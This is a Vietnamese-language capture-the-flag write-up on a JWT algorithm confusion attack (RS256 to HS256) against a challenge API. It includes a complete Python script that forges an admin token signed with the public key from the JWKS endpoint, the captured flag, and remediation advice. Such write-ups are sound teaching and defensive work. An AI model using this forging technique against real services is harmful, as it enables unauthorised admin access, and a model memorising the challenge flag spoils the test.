# [CTF Writeup] Crypto Challenge 1: Sometimes the Right Signature Is Still Wrong

**Category:** Cryptography / Web Security
**Points:** 30
**Target:** `NovaMind API — Developer Portal v3.2`
**Vulnerability:** JWT Algorithm Confusion / Key Confusion Attack (RS256 → HS256)

---

## 1. Tổng quan

Challenge cung cấp một REST API sử dụng **JSON Web Token (JWT)** để xác thực người dùng. Sau khi tạo Guest Session, server cấp cho client một JWT với quyền mặc định là `role: "user"`.

Các endpoint được cung cấp gồm:

* `GET /.well-known/jwks.json`: cung cấp RSA Public Key dùng để xác minh chữ ký JWT.
* `POST /api/auth/token`: tạo Guest Token.
* `GET /api/profile`: xem thông tin của tài khoản hiện tại.
* `GET /api/admin/flag`: endpoint dành riêng cho tài khoản có quyền `admin`.

Mình bắt đầu bằng cách lấy một token bình thường và xem cấu trúc của nó.

Header của JWT:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "novamind-api-key-1"
}
```

Payload:

```json
{
  "sub": "guest",
  "role": "user",
  "iat": 1787448109,
  "exp": 1787451709,
  "iss": "novamind-api"
}
```

Khi sử dụng token này để truy cập:

```http
GET /api/admin/flag
```

server từ chối request:

```json
{
  "error": "Admin access required",
  "your_role": "user",
  "required_role": "admin"
}
```

Như vậy, mục tiêu của challenge khá rõ: **tìm cách tạo một JWT được server chấp nhận nhưng có `role: "admin"`**.

Điểm đáng chú ý nhất trong token là trường:

```text
"alg": "RS256"
```

và đây cũng chính là nơi mình bắt đầu kiểm tra.

---

## 2. Phân tích JWT và phát hiện vấn đề

Tiêu đề challenge:

> *Sometimes the Right Signature Is Still Wrong*

gợi ý khá rõ về vấn đề liên quan đến **signature** và **algorithm**.

JWT của server đang sử dụng **RS256**. Đây là thuật toán chữ ký bất đối xứng, trong đó:

* Server sử dụng **RSA Private Key** để ký token.
* Client hoặc server có thể sử dụng **RSA Public Key** để kiểm tra chữ ký.
* Public Key có thể được công khai mà không làm lộ Private Key.

Thông thường, việc biết Public Key không giúp mình tự tạo một token RS256 hợp lệ, bởi vì Private Key vẫn nằm trên server.

Tuy nhiên, mình chú ý đến một điểm khác: server công khai RSA Public Key thông qua:

```text
/.well-known/jwks.json
```

Nếu backend xử lý trường `alg` của JWT không đúng cách, có khả năng xảy ra **Algorithm Confusion**.

### 2.1. Ý tưởng của Algorithm Confusion

RS256 và HS256 sử dụng hai cơ chế hoàn toàn khác nhau.

Với RS256:

```text
Private Key
     ↓
  Sign JWT
     ↓
Signature
```

Server sử dụng Public Key để verify:

```text
JWT + Public Key
       ↓
    Verify
```

Trong khi đó, HS256 sử dụng cùng một secret cho cả việc ký và xác minh:

```text
Shared Secret
     ↓
HMAC-SHA256
     ↓
Signature
```

Vấn đề xuất hiện nếu backend cho phép client quyết định thuật toán thông qua trường:

```json
"alg": "HS256"
```

thay vì cố định thuật toán được phép sử dụng.

Khi đó, một request ban đầu sử dụng:

```text
RS256
```

có thể bị chuyển thành:

```text
HS256
```

Nếu backend còn sử dụng chính RSA Public Key làm secret cho HMAC, thì Public Key vốn được công khai lại trở thành **HMAC secret**.

Lúc này, mình không cần Private Key nữa.

Chỉ cần:

1. Lấy Public Key.
2. Đổi `alg` từ `RS256` thành `HS256`.
3. Thay `role` thành `admin`.
4. Dùng Public Key làm HMAC secret để ký lại JWT.

Nếu backend thực sự mắc lỗi này, server sẽ tự xác minh chữ ký giả mạo bằng chính Public Key mà mình đang có.

---

## 3. Lấy RSA Public Key từ JWKS

Đầu tiên, mình truy cập:

```text
/.well-known/jwks.json
```

Server trả về một JSON Web Key Set (JWKS):

```json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "alg": "RS256",
      "kid": "novamind-api-key-1",
      "n": "uGfR4aM14hnc0WgNARmQMTBANdZd14R8iVy6jeqG18mMSPHKI6syspLAowlM7d9ZToup_RBtHjijnF5P4OUEZVoMyhJURFnT5Svr_RpNKokXMDdlKaeMSF04PDw5KjyJBfBZ2U2r5Ps1Of1v0nFxONGXVvKR6cJQ_fMStqAncQXWtoLTAV1FKOM7B120HTcYSJMnrtzm0XI4_2ExSnVeQyJQFXL9GiDk4gVtIIMlNY9hENNIT6_1NSru7533M3x_9BcSvu9ItTMWDg6oCBWpM7aKTCAPnNVXuqz2J3DOPthrf2O1DMZHvEsIkq3EbAp6PZSV7SPacOjW_ZEELmuFjQ",
      "e": "AQAB"
    }
  ]
}
```

Trong RSA, hai giá trị quan trọng ở đây là:

* `n`: modulus.
* `e`: exponent.

Cả hai đều được mã hóa theo Base64URL.

Mình có thể sử dụng hai giá trị này để dựng lại RSA Public Key và chuyển nó về định dạng PEM.

Kết quả thu được là:

```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuGfR4aM14hnc0WgNARmQ
MTBANdZd14R8iVy6jeqG18mMSPHKI6syspLAowlM7d9ZToup/RBtHjijnF5P4OUE
ZVoMyhJURFnT5Svr/RpNKokXMDdlKaeMSF04PDw5KjyJBfBZ2U2r5Ps1Of1v0nFx
ONGXVvKR6cJQ/fMStqAncQXWtoLTAV1FKOM7B120HTcYSJMnrtzm0XI4/2ExSnVe
QyJQFXL9GiDk4gVtIIMlNY9hENNIT6/1NSru7533M3x/9BcSvu9ItTMWDg6oCBWp
M7aKTCAPnNVXuqz2J3DOPthrf2O1DMZHvEsIkq3EbAp6PZSV7SPacOjW_ZEELmuFjQ
IDAQAB
-----END PUBLIC KEY-----
```

Public Key này vốn chỉ nên được sử dụng để **xác minh RSA signature**.

Nhưng nếu backend có lỗi Algorithm Confusion, mình có thể thử sử dụng chính chuỗi PEM này làm HMAC secret.

---

## 4. Tạo JWT giả mạo

Bước tiếp theo là tạo một JWT mới.

Header được thay từ:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "novamind-api-key-1"
}
```

thành:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "novamind-api-key-1"
}
```

Payload cũng được chỉnh lại:

```json
{
  "sub": "guest",
  "role": "admin",
  "iat": 1787448109,
  "exp": 1787534509,
  "iss": "novamind-api"
}
```

Điểm quan trọng nhất là:

```text
"role": "admin"
```

Sau đó JWT được tạo theo công thức:

```text
Base64URL(Header) + "." + Base64URL(Payload)
```

và tính HMAC-SHA256 với key chính là RSA Public Key.

---

## 5. Script khai thác

Mình sử dụng Python để tự động hóa toàn bộ quá trình:

```python
import base64
import json
import hmac
import hashlib
import requests
import urllib3

from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

urllib3.disable_warnings()

BASE_URL = "https://<INSTANCE_ID>.222.255.138.122.nip.io"


def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()

    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def b64url_decode(data):
    rem = len(data) % 4

    if rem > 0:
        data += "=" * (4 - rem)

    return base64.urlsafe_b64decode(data)


# 1. Lấy JWKS và chuyển thành PEM Public Key
jwks = requests.get(
    f"{BASE_URL}/.well-known/jwks.json",
    verify=False
).json()

key_info = jwks["keys"][0]

n_int = int.from_bytes(
    b64url_decode(key_info["n"]),
    "big"
)

e_int = int.from_bytes(
    b64url_decode(key_info["e"]),
    "big"
)

pub_key = RSAPublicNumbers(
    e_int,
    n_int
).public_key(default_backend())

pem_pub = pub_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode()

print("[+] Extracted RSA Public Key (PEM SPKI)")


# 2. Tạo Header & Payload với role=admin
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": key_info.get(
        "kid",
        "novamind-api-key-1"
    )
}

payload = {
    "sub": "guest",
    "role": "admin",
    "iat": 1787448109,
    "exp": 1787448109 + 86400,
    "iss": "novamind-api"
}

msg = (
    f"{b64url_encode(json.dumps(header))}."
    f"{b64url_encode(json.dumps(payload))}"
)


# 3. Ký JWT bằng RSA Public Key như HMAC Secret
sig = hmac.new(
    pem_pub.encode(),
    msg.encode(),
    hashlib.sha256
).digest()

forged_jwt = (
    f"{msg}.{b64url_encode(sig)}"
)

print(f"[+] Forged JWT: {forged_jwt}")


# 4. Gửi JWT giả mạo tới admin endpoint
res = requests.get(
    f"{BASE_URL}/api/admin/flag",
    headers={
        "Authorization": f"Bearer {forged_jwt}"
    },
    verify=False
)

print("\n[+] Response:")
print(json.dumps(res.json(), indent=2))
```

---

## 6. Kết quả

Request với JWT giả mạo được server chấp nhận.

Response:

```json
{
  "message": "Welcome, Administrator!",
  "flag": "flag{13832817-b170-488d-80be-63f73ba8b991}",
  "note": "You have successfully accessed the admin panel."
}
```

Điều này xác nhận rằng backend thực sự mắc lỗi **JWT Algorithm Confusion**.

Server đã tin tưởng thuật toán được chỉ định trong JWT và sử dụng RSA Public Key như HMAC secret khi `alg` được chuyển sang `HS256`.

---

## 7. Flag

```text
flag{13832817-b170-488d-80be-63f73ba8b991}
```

---

## 8. Nguyên nhân của lỗ hổng

Lỗi nằm ở cách backend xử lý thuật toán khi xác minh JWT.

Một hệ thống an toàn cần biết trước token nào được phép sử dụng thuật toán nào. Trong challenge này, backend lại để giá trị `alg` trong JWT ảnh hưởng trực tiếp đến quá trình xác minh.

Vì vậy, thay vì luôn thực hiện:

```text
JWT
 ↓
RS256 verification
 ↓
RSA Public Key
```

backend có thể bị điều khiển thành:

```text
JWT
 ↓
HS256 verification
 ↓
RSA Public Key được sử dụng như HMAC Secret
```

Đây là điểm khiến Public Key, vốn không phải thông tin bí mật, trở thành nguyên liệu đủ để tạo chữ ký hợp lệ.

Quan trọng hơn, việc thay đổi:

```text
"role": "user"
```

thành:

```text
"role": "admin"
```

không bị phát hiện vì chữ ký mới được tạo lại sau khi sửa payload.

Do đó, server nhận được một JWT có nội dung giả mạo nhưng chữ ký vẫn hợp lệ theo cách mà chính backend đang kiểm tra.

---

## 9. Biện pháp khắc phục

### 9.1. Cố định thuật toán khi verify JWT

Backend không nên tin tưởng trường `alg` do client cung cấp.

Thay vào đó, thuật toán hợp lệ phải được cấu hình rõ ràng. Ví dụ, nếu hệ thống chỉ sử dụng RS256:

```python
jwt.decode(
    token,
    public_key,
    algorithms=["RS256"]
)
```

Như vậy, nếu attacker thay đổi:

```json
"alg": "HS256"
```

server sẽ từ chối token ngay từ bước xác minh.

### 9.2. Không sử dụng Public Key làm HMAC Secret

RSA Public Key và HMAC Secret phục vụ hai mục đích hoàn toàn khác nhau.

Backend cần đảm bảo rằng:

```text
RSA Public Key
        ≠
HMAC Secret
```

Nếu hệ thống hỗ trợ cả thuật toán bất đối xứng và đối xứng, mỗi loại thuật toán phải sử dụng key material phù hợp và được quản lý độc lập.

### 9.3. Kiểm tra `kid` và key type

Ngoài `alg`, server cũng nên kiểm tra sự tương ứng giữa:

```text
alg
kid
kty
key
```

Ví dụ:

```text
RS256
  ↓
RSA key
  ↓
RSA verification
```

Không nên cho phép một RSA key bị sử dụng như HMAC secret chỉ vì token yêu cầu `HS256`.

---

## 10. Kết luận

Challenge này cho thấy một điều khá thú vị: **chữ ký hợp lệ chưa chắc đồng nghĩa với một token hợp lệ về mặt bảo mật**.

Ban đầu, mình nghĩ việc giả mạo JWT sẽ rất khó vì server sử dụng RS256 và Private Key không được công khai. Tuy nhiên, sau khi kiểm tra JWKS, mình nhận ra Public Key có thể được lấy trực tiếp từ endpoint công khai.

Từ đó, mình kiểm tra khả năng thay đổi thuật toán từ `RS256` sang `HS256`. Nếu backend cố định đúng loại key và thuật toán thì cách này sẽ thất bại. Nhưng trong challenge, server lại sử dụng chính RSA Public Key làm HMAC secret.

Kết quả là mình có thể tự tạo một JWT với:

```text
alg  = HS256
role = admin
```

và server vẫn coi token là hợp lệ.

Điểm mấu chốt của challenge không phải là phá RSA hay tìm Private Key, mà là **khai thác cách backend xử lý JWT**.

**Flag:**

```text
flag{13832817-b170-488d-80be-63f73ba8b991}
```
